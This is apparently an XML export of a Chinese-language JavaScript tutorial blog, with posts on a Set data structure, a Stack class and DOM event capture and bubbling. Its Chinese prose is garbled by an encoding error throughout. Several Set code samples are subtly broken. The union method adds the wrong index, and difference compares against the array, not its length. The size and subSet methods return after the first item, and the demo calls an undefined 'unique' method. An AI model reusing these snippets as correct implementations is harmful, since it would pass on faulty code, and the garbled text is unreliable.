é›†åˆåˆé«”é©—äº‹å¯¦ä¸Šï¼Œåœ¨ ES6 ä¸­å°±æœ‰åŸç”Ÿçš„ Setï¼Œåœ¨é€™é‚Šæˆ‘å€‘è©¦è‘—ä½¿ç”¨ JavaScript ç‰©ä»¶æ¨¡ä»¿ ES6 çš„ Set è¨­è¨ˆé›†åˆè³‡æ–™çµæ§‹ï¼ˆä½¿ç”¨ç‰©ä»¶å¥½è™•æ˜¯ç‰©ä»¶ key æ˜¯å”¯ä¸€ï¼‰ã€‚

The Set object lets you store unique values of any type, whether primitive values or object references.


å»ºç«‹é›†åˆé¡åˆ¥å’Œæ–¹æ³•
 function Set() &#123;	var items = &#123;&#125;;	this.add(value) &#123;&#125;;	this.remove(value) &#123;&#125;;	this.has(value) &#123;&#125;;	this.clear() &#123;&#125;;	this.size() &#123;&#125;;	this.values() &#123;&#125;;&#125;


has(value)ï¼šåˆ¤æ–·æ˜¯å¦å…ƒç´ åœ¨é›†åˆä¸­ï¼Œè‹¥æœ‰å›å‚³ trueï¼Œåä¹‹å‚³å› false

 this.has = function(value) &#123;	return items.hasOwnProperty(value);	// ç”±æ–¼æˆ‘å€‘æ˜¯ä½¿ç”¨ JavaScript ç‰©ä»¶å¯¦ä½œæ‰€ä»¥ä¹Ÿå¯ä»¥ä½¿ç”¨ value in items&#125;


add(value)ï¼šæ–°å¢å…ƒç´ åˆ°é›†åˆ

 this.add = function(value) &#123;	if(!this.has(value)) &#123;		items[value] = value;		return true;	&#125;	return false;&#125;


remove(value)ï¼šåˆªé™¤å…ƒç´ 

 this.remove = function(value) &#123;	if(this.has(value)) &#123;		delete items[value];		return true;	&#125;	return false;&#125;;


clear()ï¼šç§»é™¤é›†åˆæ‰€æœ‰å…ƒç´ 

 this.clear = function() &#123;	items = &#123;&#125;;&#125;


size()ï¼šå›å‚³é›†åˆå…ƒç´ æ•¸é‡

ä½¿ç”¨é¡ä¼¼æ–¼ Linked List çš„ length è®Šæ•¸è¨ˆç®—æ³•ï¼Œç•¶æ–°å¢ã€åˆªé™¤å…ƒç´ æ™‚é †ä¾¿å¢æ¸›é•·åº¦

  this.size = function() &#123;	return length;&#125;


ä½¿ç”¨ JavaScript å…§å»º Object é¡åˆ¥çš„å…§å»ºå‡½æ•¸ keys

  this.size = function() &#123;	return Object.keys(items).length;&#125;


æ‰‹å‹•è¿­ä»£åˆ¤æ–·æ˜¯å¦å­˜åœ¨é›†åˆä¸­ä¸¦ç´¯åŠ å€‹æ•¸

  this.size = function() &#123;	let count = 0;	// ç‰¹åˆ¥æ³¨æ„åœ¨ JavaScript ä¸­ for in æœƒä¸€èµ·æŠŠç¹¼æ‰¿æ–¼ Object é¡åˆ¥å’Œç‰©ä»¶è‡ªèº«çš„æ‰€æœ‰ç›¸é—œéç›¸é—œè³‡æ–™çµæ§‹çš„å±¬æ€§ä¸€èµ·è¿­ä»£å‡ºä¾†	for(let prop in items) &#123;		// åˆ¤æ–·æ˜¯å¦å±¬æ–¼ items çš„å±¬æ€§		if(items.hasOwnProperty(prop)) &#123;			++count;		&#125;		return count;	&#125;&#125;

values()ï¼šå›å‚³é›†åˆæ‰€æœ‰å€¼ï¼Œä½¿ç”¨ JavaScript å…§å»º Object é¡åˆ¥çš„å…§å»ºå‡½æ•¸ keys ä»¥é™£åˆ—å½¢å¼å›å‚³


 this.values = function() &#123;	return Object.keys(items);&#125;

 å¦å¤–ä¸€ç¨®ç€è¦½å™¨ç›¸å®¹æ€§è¼ƒé«˜çš„å¯«æ³•
 this.value = function() &#123;	let keys = [];	for(let key in items) &#123;		keys.push(key);	&#125;	return keys;&#125;

ä½¿ç”¨é›†åˆé¡åˆ¥
 const set = new Set();set.add(12);console.log(set.values());console.log(set.has(12));console.log(set.size());set.add(12);set.add(7);set.remove(12);set.add(1);console.log(set.has(12));console.log(set.values());console.log(set.size());

é›†åˆæ“ä½œ
åƒè€ƒæ•¸å­¸ä¸Šçš„é›†åˆæ¦‚å¿µï¼Œæˆ‘å€‘å¯ä»¥é‡å°é›†åˆé€²è¡Œä»¥ä¸‹æ“ä½œï¼š

è¯é›† å°æ–¼çµ¦å®šå…©é›†åˆï¼Œå›å‚³ä¸€å€‹åŒ…å«å…©å€‹é›†åˆä¸­æ‰€æœ‰å…ƒç´ çš„æ–°é›†åˆ
 this.union = function(otherSet) &#123;	// é¦–å…ˆå»ºç«‹ä»£è¡¨è¯é›†çš„æ–°é›†åˆ	let unionSet = new Set();	let values = this.values();	for(var i = 0; i &lt; values.length; i++) &#123;		unionSet.add(values[i]);	&#125;	values = otherSet.values();	for(let j = 0; j &lt; values.length; j++) &#123;		unionSet.add(values[i]);	&#125;	return unionSet;&#125;

 åœ¨ console æ¸¬è©¦ï¼š
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let unionSet = setA.unique(setB);console.log(unionSet);

äº¤é›† å°æ–¼çµ¦å®šå…©é›†åˆï¼Œå›å‚³ä¸€å€‹åŒ…å«å…©å€‹é›†åˆä¸­å…±æœ‰å…ƒç´ çš„æ–°é›†åˆ
 this.intersection = function(otherSet) &#123;	let intersectionSet = new Set();	let values = this.values();	for(let i = 0; i &lt; values.length; i++) &#123;		if(otherSet.has(values[i])) &#123;			intersectionSet.add(values[i]);		&#125;	&#125;	return intersectionSet;&#125;

 åœ¨ console æ¸¬è©¦ï¼š
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let intersectionSet = setA.intersection(setB);console.log(intersectionSet);

å·®é›† å°æ–¼çµ¦å®šå…©é›†åˆï¼Œå›å‚³ä¸€å€‹åŒ…å«æ‰€æœ‰å­˜åœ¨ç¬¬ä¸€å€‹é›†åˆä½†ä¸å­˜åœ¨æ–¼ç¬¬äºŒé›†åˆçš„å…ƒç´ é›†åˆ
 this.difference = function(otherSet) &#123;	let differenceSet = new Set();	let values = this.values();	for(let i = 0; i &lt; values; i++) &#123;		if(!otherSet.has(values[i])) &#123;			differenceSet.add(values[i]);		&#125;	&#125;	return differenceSet;&#125;

 åœ¨ console æ¸¬è©¦ï¼š
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let differenceSet = setA.difference(setB);console.log(differenceSet);

å­é›† é©—è­‰çµ¦å®šé›†åˆæ˜¯å¦ç‚ºå¦ä¸€å€‹é›†åˆçš„å­é›†
 this.subSet = function(otherSet) &#123;	if(this.size() &gt; otherSet.size()) &#123;		return false;	&#125; else &#123;		let values = this.values();		for(let i = 0; i &lt; values.length; i++) &#123;			if(!otherSet.has(values[i])) &#123;				return false;			&#125;			return true;		&#125;	&#125;&#125;

 åœ¨ console æ¸¬è©¦ï¼š
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let subSet = setA.subSet(setB);console.log(subSet);

ç¸½çµåœ¨é€™ç¯‡æ–‡ç« ä¸­æˆ‘å€‘å­¸æœƒäº†ï¼š

ä»€éº¼æ˜¯é›†åˆï¼ˆSetï¼‰ï¼Ÿ
å»ºç«‹é›†åˆé¡åˆ¥å’Œæ–¹æ³•
é›†åˆæ“ä½œï¼ˆè¯é›†ã€äº¤é›†ã€å·®é›†ã€å­é›†ï¼‰

å»¶ä¼¸é–±è®€
MDN Set

ï¼ˆimage via appleã€wikipediaï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>è³‡æ–™çµæ§‹</tag>
        <tag>é™£åˆ—</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>é›œæ¹Šè¡¨</tag>
        <tag>å­—å…¸</tag>
        <tag>ä½‡åˆ—</tag>
        <tag>set</tag>
        <tag>é›†åˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ JavaScript å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ï¼šå †ç–Šï¼ˆStackï¼‰ç¯‡</title>
    <url>/2016/06/24/javascript-data-structure-algorithm-stack/</url>
    <content><![CDATA[
å‰è¨€åœ¨ CS æ±Ÿæ¹–ä¸Šæ›¾å‚³è¨€ï¼šç¨‹å¼è¨­è¨ˆ = è³‡æ–™çµæ§‹ + æ¼”ç®—æ³•ã€‚åœ¨ä¸€èˆ¬çš„å¤§å°ˆé™¢æ ¡è£¡ï¼Œè³‡æ–™çµæ§‹ï¼ˆData Structureï¼‰èˆ‡æ¼”ç®—æ³•ï¼ˆAlgorithmï¼‰å¹¾ä¹éƒ½æ˜¯é›»è…¦ç§‘å­¸ï¼ˆComputer Scienceï¼‰å’Œè³‡è¨Šç›¸é—œç§‘ç³»çš„åŸºç¤å¿…ä¿®èª²ï¼Œåœ¨é€™äº›èª²å ‚ä¸­å¤šåŠæ˜¯ä½¿ç”¨ C&#x2F;C++ æˆ–æ˜¯ Java é€²è¡Œæ•™å­¸ï¼Œè¨±å¤šåˆå­¸å­¸ç”Ÿä¹Ÿå› ç‚ºå°æ–¼é€™äº›èªè¨€çš„æŒæ¡åº¦ä¸å¤ ï¼Œåè€Œè¿·å¤±åœ¨è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•çš„ä¸–ç•Œè£¡ï¼Œç„¶è€Œæœ¬ç³»åˆ—æ–‡ç« å°‡é€é JavaScript å»å­¸ç¿’ä¸€äº›ç¶“å…¸çš„è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ã€‚ä½œç‚ºä¸€å€‹æ—©æœŸé™æ–¼ç€è¦½å™¨ç«¯é–‹ç™¼çš„ç¨‹å¼èªè¨€ï¼Œç¾åœ¨çš„ JavaScript æ—©å·²ä¸èƒ½åŒæ—¥è€Œèªï¼Œä¸ç®¡æ˜¯å‰å¾Œç«¯é–‹ç™¼ã€è¡Œå‹•ç«¯ã€æ¡Œé¢ç«¯ã€ç¡¬é«”é–‹ç™¼ç­‰éƒ½å¯ä»¥çœ‹åˆ°å®ƒçš„èº«å½±ï¼Œè€Œ JavaScript è¼•é‡å’Œæ­é…ä¾¿åˆ©çš„ç€è¦½å™¨é–‹ç™¼è€…å·¥å…·ç‰¹æ€§ä¹Ÿè®“å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•æ›´ç‚ºæœ‰è¶£ï¼æœ¬ç¯‡å°‡ä½¿ç”¨ JavaScript ä¾†ä»‹ç´¹å †ç–Šï¼ˆStackï¼‰é€™å€‹ç¶“å…¸çš„è³‡æ–™çµæ§‹ã€‚
ä»€éº¼æ˜¯å †ç–Šï¼ˆStackï¼‰ï¼Ÿæ ¹æ“šæ•™ç§‘æ›¸çš„èªªæ³•ï¼šå †ç–Šæ˜¯ä¸€ç¨®éµå¾ª å¾Œé€²å…ˆå‡ºï¼ˆLast In First Outï¼ŒLIFOï¼‰çš„æœ‰åºé›†åˆã€‚åœ¨å †ç–Šçš„ä¸–ç•Œè£¡ï¼Œç”±æ–¼éµå®ˆå¾Œé€²å…ˆå‡ºåŸå‰‡ï¼Œè¼ƒæ–°çš„å…ƒç´ æœƒé è¿‘é ‚éƒ¨ï¼ˆå †ç–Šå°¾éƒ¨ï¼‰ï¼Œè¼ƒèˆŠçš„å…ƒç´ æœƒåœ¨å †ç–Šçš„åº•éƒ¨ã€‚åœ¨ç¨‹å¼èªè¨€ä¸­ï¼Œæ–¹æ³•ï¼ˆmethodï¼‰çš„å‘¼å«ã€é‹ç®—å¼çš„è½‰æ›ï¼ˆä¾‹å¦‚ï¼šä¸­åºè½‰å¾Œåºï¼‰æˆ–æ˜¯ç·¨è­¯å™¨å’Œè¨˜æ†¶é«”ä¸­å„²å­˜è®Šæ•¸ç­‰éƒ½å¯ä»¥çœ‹åˆ°å †ç–Šçš„æ‡‰ç”¨ã€‚
è½èµ·ä¾†é›¢ç”Ÿæ´»æœ‰é»é™é ï¼Ÿäº‹å¯¦ä¸Šï¼Œåœ¨ç”Ÿæ´»ä¸­æœ‰è¨±å¤šä½¿ç”¨å †ç–Šçš„æ¡ˆä¾‹ï¼šè‡ªåŠ©é¤åº—çš„ç›¤å­çš„æ“ºæ”¾ï¼Œæ›¸åº—æ“ºæ”¾åœ¨æ¡Œä¸Šçš„æ›¸å †ç­‰ç­‰ï¼Œç•¶ä½ æŠŠç›¤å­å¾ç›¤å †æœ€ä¸Šé¢æ‹¿èµ·ä¾†ä¸€å€‹ç›¤å­å°±æ˜¯åŸ·è¡Œå †ç–Šçš„ pop() æ–¹æ³•ï¼Œè‹¥æ˜¯æŠŠç›¤å­æ”¾å›ç›¤å †æœ€ä¸Šé¢ï¼Œå°±æ˜¯åŸ·è¡Œ push(element) æ–¹æ³•ï¼Œæœ‰æ²’æœ‰å¾ˆç°¡å–®ï¼Ÿä¸‹æ¬¡å»è‡ªåŠ©é¤å»³ç”¨é¤æ™‚ï¼Œå¯åˆ¥å¿˜äº†å’Œæœ‹å‹èªªä½ ç¾åœ¨æ­£åœ¨å¯¦ä½œä¸€å€‹å †ç–Šå–”ï¼
å»ºç«‹å †ç–Šæ¥ä¸‹ä¾†æˆ‘å€‘æ­£å¼è¦é–‹å§‹å¯¦ä½œæˆ‘å€‘å †ç–Šã€‚é¦–å…ˆï¼Œæˆ‘å€‘é–‹å•Ÿä¸€å€‹ stack.js æª”æ¡ˆï¼Œå»ºç«‹ä¸€å€‹ Stack é¡åˆ¥ï¼š
function Stack() &#123;	// é¡åˆ¥å…§éƒ¨å®£å‘Š Stack çš„å±¬æ€§å’Œæ–¹æ³•&#125;

å±¬æ€§ï¼š

let items &#x3D; []; &#x2F;&#x2F; æˆ‘å€‘é€™é‚Šä½¿ç”¨é™£åˆ— array çš„æ–¹å¼ä¾†å„²å­˜å †ç–Šå…§çš„å…ƒç´ 

æ–¹æ³•ï¼š

push(elements)ï¼šæ–°å¢ä¸€å€‹æˆ–å¤šå€‹å…ƒç´ åˆ°å †ç–Šé ‚éƒ¨
pop()ï¼šç§»é™¤å †ç–Šé ‚éƒ¨å…ƒç´ ï¼ŒåŒæ™‚è¿”å›è¢«ç§»é™¤çš„å…ƒç´ 
peek() æˆ– top()ï¼šåƒ…è¿”å›å †ç–Šå…ƒç´ ï¼Œä¸åšä»»ä½•ä¿®æ”¹
isEmpty()ï¼šæª¢æŸ¥å †ç–Šæ˜¯å¦ç‚ºç©ºï¼Ÿè‹¥å †ç–Šå…§ç„¡ä»»ä½•å…ƒç´ å³è¿”å› trueï¼Œåä¹‹è¿”å› false
clear()ï¼šæ¸…ç©ºå †ç–Šè£¡çš„æ‰€æœ‰å…ƒç´ 
size()ï¼šè¿”å›å †ç–Šè£¡çš„å…ƒç´ å€‹æ•¸ï¼Œé¡ä¼¼æ–¼é™£åˆ—çš„ length å±¬æ€§

1. push(elements)ã€pop()ç”±æ–¼æˆ‘å€‘ä½¿ç”¨é™£åˆ— Array ç•¶åšå †ç–Šçš„å„²å­˜æ–¹å¼ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥ä½¿ç”¨é™£åˆ—å…§å»ºçš„ push(element) å’Œ pop() æ–¹å¼ä¾†å¯¦ä½œå¾Œé€²å…ˆå‡ºï¼ˆLast In First Outï¼ŒLIFOï¼‰çš„ç‰¹æ€§ï¼Œè®“å…ƒç´ çš„æ–°å¢å’Œåˆªé™¤åªèƒ½åœ¨å †ç–Šå°¾ç«¯ç™¼ç”Ÿã€‚
function Stack() &#123;	let items = [];	this.push = function(element) &#123;		items.push(element);	&#125;	this.pop = function() &#123;		return items.pop();	&#125;&#125;


2. peek()è‹¥æ˜¯æˆ‘å€‘æƒ³çŸ¥é“å †ç–Šä¸­æœ€å¾Œä¸€å€‹å…ƒç´ ï¼ˆæœ€é ‚ç«¯ï¼‰ï¼Œæˆ‘å€‘å¯ä»¥å¯¦ä½œ peek() æ–¹æ³•ï¼Œè¿”å›é ‚éƒ¨å…ƒç´ ã€‚
function Stack() &#123;	let items = [];	this.peek = function() &#123;		return items[items.length - 1];	&#125;&#125;

3. isEmpty()è‹¥æˆ‘å€‘æƒ³çŸ¥é“å †ç–Šå…§éƒ¨æ˜¯å¦é‚„æœ‰å…ƒç´ ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ isEmpty() ä¾†åˆ¤æ–·ï¼Œè‹¥å †ç–Šç‚ºç©ºè¿”å› trueï¼Œåä¹‹è¿”å› falseã€‚
function Stack() &#123;	let items = [];	this.isEmpty = function() &#123;		return items.length === 0;	&#125;&#125;

4. clear()è‹¥æˆ‘å€‘æƒ³æ¸…ç©ºæ•´å€‹å †ç–Šçš„è©±å¯ä»¥ä½¿ç”¨ clear() æ–¹æ³•ï¼Œå°‡å †ç–Šå…ƒç´ éƒ½åˆªé™¤ã€‚
function Stack() &#123;	let items = [];	this.clear = function() &#123;		items = [];	&#125;&#125;

5. size()é€é size() æ–¹æ³•æˆ‘å€‘å¯ä»¥å–å¾—å †ç–Šçš„å¤§å°ï¼ˆå…±æœ‰å¹¾å€‹å…ƒç´ ï¼‰ã€‚
function Stack() &#123;	let items = [];	this.size = function() &#123;		return items.length;	&#125;&#125;

å®Œæ•´ç¨‹å¼ç¢¼function Stack() &#123;	var items = [];	this.push = function(element) &#123;		items.push(element);	&#125;	this.pop = function() &#123;		return items.pop();	&#125;	this.peek = function() &#123;		return items[items.length - 1];	&#125;	this.isEmpty = function() &#123;		return items.length === 0;	&#125;	this.clear = function() &#123;		items = [];	&#125;	this.size = function() &#123;		return items.length;	&#125;	// åŠ å…¥å°å‡ºçµæœæ–¹æ³•	this.print = function() &#123;		console.log(items.toString());	&#125;&#125;

æˆæœå±•ç¤ºæ¥ä¸‹ä¾†æˆ‘å€‘å¯ä»¥æ‰“é–‹ç€è¦½å™¨é–‹ç™¼å·¥å…·ï¼ˆä¾‹å¦‚ï¼šChrome Developer Tool æˆ–æ˜¯ Firebugï¼‰ä¸­çš„ console ä¾†å¯¦é©—æˆ‘å€‘çš„å †ç–Šï¼ˆstackï¼‰ã€‚æˆ‘å€‘å¯ä»¥å°‡ä¸Šè¿°å®Œæˆçš„ Stack é¡åˆ¥è²¼åˆ° console ä¸­ï¼Œä¸¦ new ä¸€å€‹ Stack ç‰©ä»¶çµ¦ stack è®Šæ•¸ï¼š
// å…ˆè²¼ä¸Šä¸Šè¿°å®Œæ•´ Stack é¡åˆ¥ï¼Œç„¶å¾Œ new ä¸€å€‹ç‰©ä»¶var stack = new Stack();stack.push(&#x27;æ¾ä¸‹å•ç«¥å­&#x27;);stack.push(&#x27;è¨€å¸«æ¡è—¥å»&#x27;);stack.push(&#x27;åªåœ¨æ­¤å±±ä¸­&#x27;);stack.push(&#x27;é›²æ·±ä¸çŸ¥è™•&#x27;);stack.pop();// æ¥ä¸‹ä¾†æˆ‘å€‘å°‡å¯ä»¥é€é stack ç‰©ä»¶ä¾†æ“ä½œå †ç–Šçš„æ–¹æ³•ï¼šconsole.log(stack.size()); // ä½ ç­”å°äº†å—ï¼Ÿconsole.log(stack.peek());stack.clear();console.log(stack.isEmpty());

ç¸½çµstack.push(&#39;è‘¡è„ç¾é…’å¤œå…‰æ¯&#39;);stack.push(&#39;æ¬²é£²çµç¶é¦¬ä¸Šå‚¬&#39;);stack.push(&#39;å¤ä¾†å¾æˆ°å¹¾äººå›&#39;);stack.pop();stack.push(&#39;é†‰è‡¥æ²™å ´å›è«ç¬‘&#39;);
å˜¿ï¼Œä½ çŸ¥é“ç¾åœ¨ stack.peek() çš„çµæœå—ï¼Ÿæ²’éŒ¯ï¼Œç­”æ¡ˆå°±æ˜¯ï¼šé†‰è‡¥æ²™å ´å›è«ç¬‘ã€‚è‹¥æ˜¯ç­”éŒ¯çš„è®€è€…ï¼Œåˆ¥ç°å¿ƒï¼Œæˆ‘å€‘ä¸æœƒç¬‘ä½ çš„ã€‚ä½ å¯ä»¥å†å›åˆ°ä¸Šé¢é‡æ–°é–±è®€å’Œå‹•æ‰‹å¯¦ä½œï¼Œç›¸ä¿¡å¾ˆå¿«å°±èƒ½äº†è§£å †ç–Šçš„æ ¸å¿ƒæ¦‚å¿µã€‚
äº‹å¯¦ä¸Šï¼Œå †ç–Šï¼ˆStackï¼‰ã€ä½‡åˆ—ï¼ˆQueueï¼‰éƒ½æ˜¯éå¸¸å…¸å‹çš„è³‡æ–™çµæ§‹ã€‚ä»¥ä¸Šåˆ†äº«äº†å †ç–Šï¼ˆStackï¼‰çš„åŸºæœ¬æ¦‚å¿µï¼Œç›¸ä¿¡é€éå‹•æ‰‹å¯¦ä½œä¸¦å’Œç”Ÿæ´»çµåˆï¼Œä½ æœƒæ›´äº†è§£å †ç–Šæ˜¯ä¸€ç¨®éµå¾ª å¾Œé€²å…ˆå‡ºï¼ˆLast In First Outï¼ŒLIFOï¼‰çš„æœ‰åºé›†åˆçš„æ„æ€ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°‡æŒçºŒä½¿ç”¨ JavaScript ä¾†ä»‹ç´¹å¸¸è¦‹çš„ç¶“å…¸è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ã€‚
å»¶ä¼¸é–±è®€
Wiki å †ç–Š
è³‡æ–™çµæ§‹(Data Structures) (Data Structures) Course 5: Stack and Queue
nzakas&#x2F;computer-science-in-javascript

(image via stack-machine)
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>è³‡æ–™çµæ§‹</tag>
        <tag>é™£åˆ—</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>é›œæ¹Šè¡¨</tag>
        <tag>å­—å…¸</tag>
        <tag>ä½‡åˆ—</tag>
        <tag>set</tag>
        <tag>é›†åˆ</tag>
        <tag>å †ç–Š</tag>
        <tag>stack</tag>
        <tag>æ£§</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼šæ•ç²èˆ‡å†’æ³¡</title>
    <url>/2017/07/15/javascript-event-propagation/</url>
    <content><![CDATA[å‰è¨€ï¼ˆè£œå……ï¼šæ„Ÿè¬ othree å‰è¼©çš„æŒ‡é»ï¼ŒæŒ‡å‡ºé€™å…¶å¯¦æ˜¯åœ¨è¬› DOM è£¡é¢äº‹ä»¶å‚³éçš„é †åºï¼Œå› æ­¤æŠŠæ¨™é¡Œä»¥åŠå…§æ–‡ä¿®æ­£ï¼ŒåŸæ¨™é¡Œç‚ºï¼šJavaScript çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼šæ•ç²èˆ‡å†’æ³¡ï¼‰
ä»Šå¤©ç‚ºå¤§å®¶å¸¶ä¾†çš„å…§å®¹æ˜¯ DOM è£¡é¢çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼Œè€Œèˆ‡é€™äº›äº‹ä»¶ç›¸é—œçš„ç¨‹å¼ç¢¼ï¼Œç›¸ä¿¡å¤§å®¶æ‡‰è©²ä¸å¤ªé™Œç”Ÿï¼Œå°±æ˜¯addEventListener, preventDefaultè·ŸstopPropagationã€‚
ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯äº‹ä»¶åœ¨ DOM è£¡é¢å‚³éçš„é †åºï¼Œä»¥åŠä½ å¯ä»¥å°é€™äº›äº‹ä»¶åšä»€éº¼ã€‚
ç‚ºä»€éº¼æœƒæœ‰ã€Œå‚³éé †åºã€é€™ä¸€è©å‘¢ï¼Ÿå‡è¨­ä½ æœ‰ä¸€å€‹ulå…ƒç´ ï¼Œåº•ä¸‹æœ‰å¾ˆå¤šliï¼Œä»£è¡¨ä¸åŒçš„ itemã€‚ç•¶ä½ é»æ“Šä»»ä½•ä¸€å€‹liçš„æ™‚å€™ï¼Œå…¶å¯¦ä½ ä¹Ÿé»æ“Šäº†ulï¼Œå› ç‚ºulæŠŠæ‰€æœ‰çš„liéƒ½åŒ…ä½äº†ã€‚
å‡å¦‚æˆ‘åœ¨å…©å€‹å…ƒç´ ä¸Šé¢éƒ½åŠ äº†eventListenerï¼Œå“ªä¸€å€‹æœƒå…ˆåŸ·è¡Œï¼Ÿé€™æ™‚å€™å‘¢ï¼ŒçŸ¥é“äº‹ä»¶çš„åŸ·è¡Œé †åºå°±å¾ˆé‡è¦ã€‚
å¦å¤–ï¼Œç”±æ–¼æŸäº›ç€è¦½å™¨ï¼ˆæ²’éŒ¯ï¼Œæˆ‘å°±æ˜¯åœ¨èªª IEï¼‰çš„æ©Ÿåˆ¶æ¯”è¼ƒä¸å¤ªä¸€æ¨£ï¼Œå› æ­¤é‚£äº›æ±è¥¿æˆ‘å®Œå…¨ä¸æœƒæåˆ°ï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥ç ”ç©¶æ–‡æœ«é™„çš„åƒè€ƒè³‡æ–™ã€‚
ç°¡å–®ç¯„ä¾‹ç‚ºäº†ä¹‹å¾Œæ–¹ä¾¿èªªæ˜ï¼Œæˆ‘å€‘å…ˆå¯«ä¸€å€‹éå¸¸ç°¡å–®çš„ç¯„ä¾‹å‡ºä¾†ï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;  &lt;ul id=&quot;list&quot;&gt;    &lt;li id=&quot;list_item&quot;&gt;      &lt;a id=&quot;list_item_link&quot; target=&quot;_blank&quot; href=&quot;http://google.com&quot;&gt;        google.com      &lt;/a&gt;    &lt;/li&gt;  &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;

åœ¨é€™å€‹ç¯„ä¾‹è£¡é¢ï¼Œå°±æ˜¯æœ€å¤–å±¤ä¸€å€‹ulï¼Œå†ä¾†liï¼Œæœ€å¾Œå‰‡æ˜¯ä¸€å€‹è¶…é€£çµã€‚ç‚ºäº†æ–¹ä¾¿è¾¨è­˜ï¼Œid çš„å–åä¹Ÿè·Ÿéšå±¤æ¶æ§‹æœ‰é—œä¿‚ã€‚
DOM ç•«æˆåœ–å¤§æ¦‚æ˜¯é•·é€™æ¨£ï¼š

æœ‰äº†é€™ä¸€å€‹ç°¡å–®çš„ HTML çµæ§‹ä¹‹å¾Œï¼Œå°±å¯ä»¥å¾ˆæ¸…æ¥šçš„èªªæ˜ DOM çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶äº†ã€‚
äº‹ä»¶çš„ä¸‰å€‹ Phaseè¦å¹«ä¸€å€‹ DOM åŠ ä¸Š click çš„äº‹ä»¶ï¼Œä½ æœƒé€™æ¨£å¯«ï¼š
const $list = document.getElementById(&#x27;list&#x27;);$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;click!&#x27;);&#125;)

è€Œé€™é‚Šçš„eè£¡é¢å°±è˜Šå«äº†è¨±å¤šé€™æ¬¡äº‹ä»¶çš„ç›¸é—œåƒæ•¸ï¼Œå…¶ä¸­æœ‰ä¸€å€‹å«åševentPhase ï¼Œæ˜¯ä¸€å€‹æ•¸å­—ï¼Œè¡¨ç¤ºé€™å€‹äº‹ä»¶åœ¨å“ªä¸€å€‹ Phase è§¸ç™¼ã€‚
const $list = document.getElementById(&#x27;list&#x27;);$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(e.eventPhase);&#125;)

eventPhaseçš„å®šç¾©å¯ä»¥åœ¨ DOM specification è£¡é¢æ‰¾åˆ°ï¼š
// PhaseTypeconst unsigned short      CAPTURING_PHASE                = 1;const unsigned short      AT_TARGET                      = 2;const unsigned short      BUBBLING_PHASE                 = 3;

é€™ä¸‰å€‹éšæ®µï¼Œå°±æ˜¯æˆ‘å€‘ä»Šå¤©çš„é‡é»ã€‚
DOM çš„äº‹ä»¶åœ¨å‚³æ’­æ™‚ï¼Œæœƒå…ˆå¾æ ¹ç¯€é»é–‹å§‹å¾€ä¸‹å‚³éåˆ°targetï¼Œé€™é‚Šä½ å¦‚æœåŠ ä¸Šäº‹ä»¶çš„è©±ï¼Œå°±æœƒè™•æ–¼CAPTURING_PHASEï¼Œæ•ç²éšæ®µã€‚
targetå°±æ˜¯ä½ æ‰€é»æ“Šçš„é‚£å€‹ç›®æ¨™ï¼Œé€™æ™‚å€™åœ¨targetèº«ä¸Šæ‰€åŠ çš„eventListenræœƒæ˜¯AT_TARGETé€™ä¸€å€‹ Phaseã€‚
